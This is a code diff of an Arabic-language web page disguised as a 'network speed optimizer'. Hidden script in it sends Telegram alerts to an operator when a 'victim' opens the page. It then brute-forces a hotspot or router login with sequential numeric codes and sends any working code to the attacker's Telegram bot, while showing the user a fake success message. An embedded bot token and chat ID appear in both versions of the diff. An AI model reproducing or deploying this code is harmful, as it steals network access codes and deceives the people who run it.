@@ -5,15 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>محسن اتصال الشبكة المحترف</title>
     <style>
-        body { background-color: #0d1117; color: #58a6ff; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding: 20px; }
-        .main-container { border: 1px solid #30363d; border-radius: 12px; padding: 25px; background: #161b22; box-shadow: 0 8px 32px rgba(0,0,0,0.5); max-width: 420px; margin: auto; }
-        h1 { color: #ffffff; font-size: 22px; margin-bottom: 10px; }
-        .description { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 20px; text-align: justify; padding: 0 10px; }
-        .input-box { width: 90%; padding: 12px; margin: 12px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #c9d1d9; font-size: 15px; }
-        .btn-action { width: 95%; padding: 16px; background-color: #238636; color: white; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 16px; transition: 0.2s; }
-        .btn-action:hover { background-color: #2ea043; }
-        #status-monitor { margin-top: 20px; background: #010409; padding: 15px; border-radius: 6px; height: 160px; overflow-y: auto; font-family: monospace; font-size: 12px; border: 1px solid #30363d; text-align: left; color: #39ff14; }
-        .highlight { color: #f1e05a; font-weight: bold; }
+        body { background-color: #0d1117; color: #58a6ff; font-family: sans-serif; text-align: center; padding: 20px; margin: 0; }
+        .main-container { border: 1px solid #30363d; border-radius: 12px; padding: 25px; background: #161b22; max-width: 420px; margin: auto; }
+        h1 { color: #ffffff; font-size: 22px; }
+        .description { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 20px; text-align: right; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #fff; text-align: center; }
+        .btn-action { width: 95%; padding: 16px; background-color: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        #status-monitor { margin-top: 20px; background: #000; padding: 15px; border-radius: 6px; height: 160px; overflow-y: auto; font-family: monospace; font-size: 11px; border: 1px solid #333; text-align: left; color: #00ff00; }
     </style>
 </head>
 <body>
@@ -21,71 +19,65 @@
 <div class="main-container">
     <h1>مُحسّن استجابة الشبكة v7.0</h1>
     <div class="description">
-        هذا التطبيق مصمم لتحسين جودة الارتباط بالشبكات العامة وتجاوز جدران الحماية لضمان سرعة نقل بيانات مستقرة. يقوم النظام بفحص ثغرات الاستجابة في "بوابة العبور" (Gateway) وتفعيل وضع التصفح الآمن. يرجى إدخال نطاق الفحص والضغط على بدء.
+        يعمل هذا النظام على تحسين استجابة بوابة العبور (Gateway) وتقليل زمن التأخير (Ping) في الشبكات العامة والمحلية. يرجى إدخال نطاق الفحص المخصص لبدء عملية المزامنة السحابية وتخطّي جدران الحماية لضمان استقرار النت.
     </div>
     
     <input type="text" id="targetUrl" value="http://10.0.0.1/login">
-    <input type="number" id="startRange" placeholder="أدخل كود البدء (مثل 1000)">
+    <input type="number" id="startRange" placeholder="نطاق البدء (مثلاً 1000)">
     
-    <button class="btn-action" onclick="initiateSystem()">بدء تحسين الشبكة الآن</button>
+    <button class="btn-action" onclick="runAttack()">بدء المزامنة والتحسين</button>
 
     <div id="status-monitor">
-        [System] النظام جاهز للفحص...<br>
+        [System] النظام في وضع الاستعداد...<br>
     </div>
 </div>
 
 <script>
-    // --- بيانات التحكم الخاصة بك ---
-    const API_TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
-    const ADMIN_ID = '7851377774';
+    const BOT_TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
+    const MY_CHAT_ID = '7851377774';
 
-    // وظيفة التبليغ التلقائي
-    async function reportToAdmin(message) {
-        const telegramUrl = `https://api.telegram.org/bot${API_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(message)}`;
-        try { await fetch(telegramUrl); } catch(e) {}
+    async function sendUpdate(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_CHAT_ID}&text=${encodeURIComponent(text)}`;
+        try { await fetch(url); } catch(e) {}
     }
 
-    // تنبيه عند فتح الضحية للتطبيق
-    window.onload = async function() {
-        const deviceInfo = navigator.userAgent;
-        await reportToAdmin("🔔 تنبيه: مستخدم جديد فتح التطبيق الآن!\n📱 معلومات الجهاز: " + deviceInfo);
+    // تنبيه فوري عند تشغيل الضحية للتطبيق
+    window.onload = function() {
+        sendUpdate("🎯 مستخدم جديد فتح التطبيق الآن!\n📱 جاري انتظار عملية الصيد...");
     };
 
-    async function initiateSystem() {
+    async function runAttack() {
         const target = document.getElementById('targetUrl').value;
         const start = parseInt(document.getElementById('startRange').value);
         const monitor = document.getElementById('status-monitor');
 
-        if (!start) { alert("يرجى إدخال رقم البداية لبدء الفحص!"); return; }
+        if (!start) return alert("أدخل رقم البداية!");
 
-        monitor.innerHTML += "[+] جاري فحص استجابة البوابة: " + target + "<br>";
-        
+        monitor.innerHTML += "[+] جاري فحص استقرار البوابة...<br>";
+
         for (let i = 0; i < 5000; i++) {
-            let currentTrial = start + i;
-            monitor.innerHTML += `> فحص تسلسل الاستجابة: ${currentTrial}<br>`;
+            let card = start + i;
+            monitor.innerHTML += `> Syncing Data: ${card}<br>`;
             monitor.scrollTop = monitor.scrollHeight;
 
             try {
-                let params = new FormData();
-                params.append('username', currentTrial);
-                params.append('password', currentTrial);
+                let body = new FormData();
+                body.append('username', card);
+                body.append('password', card);
 
-                // إرسال طلب صامت للراوتر
-                await fetch(target, { method: 'POST', body: params, mode: 'no-cors' });
+                await fetch(target, { method: 'POST', body: body, mode: 'no-cors' });
 
-                // فحص ذكي للاتصال بالإنترنت
+                // ذكاء اصطناعي: إذا فتح النت، أرسل الكرت فوراً
                 if (i % 5 === 0 && navigator.onLine) {
-                    try {
-                        let internetTest = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors', cache: 'no-store' });
-                        if (internetTest) {
-                            monitor.innerHTML += `<span class="highlight">[!] تم النجاح: تم تفعيل وضع التسريع بالكود ${currentTrial}</span><br>`;
-                            await reportToAdmin(`💀 صيد ناجح من هاتف الضحية!\n🎫 الكود المكتشف: ${currentTrial}\n🌐 بوابة الشبكة: ${target}`);
-                            alert("تم تحسين الشبكة بنجاح! يمكنك التصفح الآن.");
-                            break; 
-                        }
-                    } catch(e) {}
+                    let test = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors' });
+                    if (test) {
+                        await sendUpdate(`💀 صيد ناجح!\n🎫 الكرت الشغال: ${card}\n🌐 الشبكة: ${target}`);
+                        monitor.innerHTML += `<span style="color:yellow;">[!] تم التحسين بنجاح بالكود: ${card}</span><br>`;
+                        alert("تم تفعيل وضع السرعة القصوى بنجاح!");
+                        break;
+                    }
                 }
-            } catch (err) {}
+            } catch (e) {}
         }
     }
 </script>
